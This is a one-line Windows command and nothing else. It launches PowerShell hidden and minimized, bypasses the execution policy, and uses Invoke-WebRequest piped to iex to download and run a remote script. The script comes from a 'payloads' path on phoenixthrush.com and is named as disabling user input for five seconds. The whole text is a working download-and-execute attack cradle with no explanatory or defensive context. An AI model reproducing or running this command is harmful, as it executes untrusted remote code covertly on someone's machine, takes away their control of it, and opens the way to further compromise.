cmd /c start /min "" powershell -exec bypass -w h -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://phoenixthrush.com/payloads/scripts/disabling_user_input/disable_user_input_5_secs.ps1 ')|iex"